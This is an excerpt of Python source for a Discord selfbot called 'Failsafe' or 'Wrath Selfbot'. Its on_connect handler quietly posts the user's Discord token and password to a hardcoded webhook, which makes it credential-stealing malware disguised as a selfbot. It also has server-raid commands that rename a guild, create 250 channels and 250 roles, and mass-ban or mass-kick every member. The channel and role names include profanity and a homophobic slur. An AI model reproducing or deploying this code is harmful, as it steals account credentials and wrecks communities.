...
user_credentials = ['Wrath', 'password']
...
def startprint():
    ...
    print(f'''{Fore.RESET}
                       ...
                       {Fore.CYAN}Failsafe Selfbot{SELFBOT.__version__} | {Fore.GREEN}Logged in as: {Exeter.user.name}#{Exeter.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{Exeter.user.id}   
...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/874106352648200263/kk7B7NXTVun_p0MMF7JaO9ycgUxl6X85XUMTfti9XRS6N6uGfs8jJY9NJEn_i8wkOL2q',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
    startprint()
...
async def help(ctx, category=None):
    ...
    if category is None:
        ...
        embed.set_author(name="𝐖𝐑𝐀𝐓𝐇 𝐒𝐄𝐋𝐅𝐁𝐎𝐓 | 𝙋𝙍𝙀𝙁𝙄𝙓: " + str(Exeter.command_prefix),
                         icon_url=Exeter.user.avatar_url)
        embed.set_thumbnail(url=Exeter.user.avatar_url)
        embed.set_image(url="https://cdn.discordapp.com/attachments/818039398900695055/858065588315488286/mp4.gif")
        ...
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/818039398900695055/858074100105478204/be.gif")
        ...
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/852378597623857185/858074786190065664/2.gif")
        ...
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/852378597623857185/858079025103372308/MOSHED-2021-6-25-15-11-22.gif")
        ...
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(
            url="https://cdn.discordapp.com/attachments/852378597623857185/858074810906574868/1.gif")
        ...
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/852378597623857185/858080354564046898/tenor_1.gif")
...
async def destroy(ctx):
    ...
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="fuck you - the Failsafe",
            reason="fuck you - the Failsafe",
            icon=None,
            banner=None
        )
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="fuck you - the Failsafe")
    for _i in range(250):
        await ctx.guild.create_role(name="Faggot", color=RandomColor())
...
async def massban(ctx):
    ...
    for user in users:
        try:
            await user.ban(reason="fuck you - the Failsafe")
        except:
            pass
...
async def masskick(ctx):
    ...
    for user in users:
        try:
            await user.kick(reason="fuck you - the Failsafe")
        except:
            pass
